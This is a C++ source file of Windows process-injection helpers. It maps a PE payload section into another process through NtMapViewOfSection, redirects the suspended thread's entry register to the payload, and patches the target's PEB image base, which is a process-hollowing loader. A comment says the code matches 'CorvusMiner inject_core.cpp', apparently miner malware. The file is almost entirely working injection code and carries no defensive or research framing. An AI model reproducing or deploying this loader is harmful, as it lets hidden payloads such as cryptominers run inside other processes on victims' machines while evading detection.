#include "injection_helpers.h"
#include "pe_hdrs_helper.h"
#include <stdio.h>
#include <ntstatus.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

/* NtMapViewOfSection function pointer */
typedef long(NTAPI *pNtMapViewOfSection)(
    void *SectionHandle,
    void *ProcessHandle,
    void **BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    SIZE_T *ViewSize,
    unsigned long InheritDisposition,
    unsigned long AllocationType,
    unsigned long Win32Protect
);

static pNtMapViewOfSection g_NtMapViewOfSection = nullptr;

static bool load_map_api()
{
    if (g_NtMapViewOfSection) return true;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    g_NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    return g_NtMapViewOfSection != nullptr;
}

PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_size, const BYTE *pe_buffer)
{
    if (!load_map_api()) {
        fprintf(stderr, "[injection_helpers] NtMapViewOfSection not available\n");
        return nullptr;
    }

    fprintf(stderr, "[injection_helpers] map_section_into_process called: hProcess=%p, hSection=%p, payload_size=%lu\n", 
           hProcess, hSection, payload_size);

    SIZE_T view_size = 0;
    PVOID base_address = 0;

    /* Exact match of map_buffer_into_process from CorvusMiner inject_core.cpp */
    fprintf(stderr, "[injection_helpers] Calling NtMapViewOfSection with ViewShare=2, PAGE_READONLY\n");
    long status = g_NtMapViewOfSection(hSection, hProcess, &base_address, NULL, NULL, NULL, &view_size, 2, NULL, PAGE_READONLY);
    fprintf(stderr, "[injection_helpers] NtMapViewOfSection returned: status=0x%lX, base_address=%p, view_size=0x%llX\n", 
           (unsigned long)status, base_address, (ULONGLONG)view_size);
    
    if (status != 0) {
        /* STATUS_IMAGE_NOT_AT_BASE (0x40000003): image mapped at a different base due to ASLR.
           Only safe to continue if the PE has a relocation table; without one, all absolute
           addresses in the image are wrong at the new base and the process will crash. */
        if ((ULONG)status == 0x40000003) {
            if (!pe_has_relocations(pe_buffer)) {
                fprintf(stderr, "[injection_helpers] STATUS_IMAGE_NOT_AT_BASE and PE has no relocations - cannot run at relocated base, aborting\n");
                return nullptr;
            }
            fprintf(stderr, "[injection_helpers] WARNING: Image mapped at non-preferred base (has relocations, continuing)\n");
        } else {
            fprintf(stderr, "[injection_helpers] NtMapViewOfSection failed: 0x%lX\n", (unsigned long)status);
            return nullptr;
        }
    }

    fprintf(stderr, "[injection_helpers] Mapped base: 0x%llX, view size: 0x%llX\n", (ULONGLONG)base_address, (ULONGLONG)view_size);

    Sleep(20);
    FlushViewOfFile(base_address, view_size);

    return base_address;
}

bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi)
{
    fprintf(stderr, "[injection_helpers] redirect_entry_point called: loaded_pe=%p, load_base=%p, hThread=%p\n", 
           loaded_pe, load_base, pi.hThread);
    
    /* Calculate VA of entry point */
    DWORD ep_rva = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep_rva;

    fprintf(stderr, "[injection_helpers] Entry point VA: 0x%llX (RVA: 0x%lX)\n", ep_va, ep_rva);

    /* Get thread context */
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &context)) {
        fprintf(stderr, "[injection_helpers] GetThreadContext failed: %lu\n", GetLastError());
        return false;
    }

    /* Redirect RCX (on x64) or EAX (on x86) to entry point */
#ifdef _WIN64
    context.Rcx = ep_va;
#else
    context.Eax = (DWORD)ep_va;
#endif

    /* Set modified context */
    if (!SetThreadContext(pi.hThread, &context)) {
        fprintf(stderr, "[injection_helpers] SetThreadContext failed: %lu\n", GetLastError());
        return false;
    }

    fprintf(stderr, "[injection_helpers] Entry point redirected successfully\n");

    Sleep(100);

    /* Update PEB ImageBaseAddress so the process sees the correct module base.
       PEB layout: InheritedAddressSpace(1) + ReadImageFileExecOptions(1) + BeingDebugged(1) + SpareBool(1)
       then on 64-bit padding to ULONGLONG alignment, then Mutant (ULONGLONG on 64-bit),
       then ImageBaseAddress at offset 2*sizeof(ULONGLONG) = 16.
       On 32-bit: 4 DWORDs header => offset 2*sizeof(DWORD) = 8. */
#ifdef _WIN64
    ULONGLONG peb_addr = context.Rdx;  /* RDX holds PEB address in initial thread context */
    ULONGLONG img_base_offset = sizeof(ULONGLONG) * 2; /* 16 bytes into PEB */
#else
    ULONGLONG peb_addr = context.Ebx;
    ULONGLONG img_base_offset = sizeof(DWORD) * 2;
#endif
    LPVOID remote_img_base = (LPVOID)(peb_addr + img_base_offset);
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote_img_base, &load_base, sizeof(load_base), &written)) {
        fprintf(stderr, "[injection_helpers] WriteProcessMemory (PEB ImageBase) failed: %lu\n", GetLastError());
        /* Non-fatal: entry point is already set */
    } else {
        fprintf(stderr, "[injection_helpers] PEB ImageBaseAddress updated\n");
    }

    return true;
}
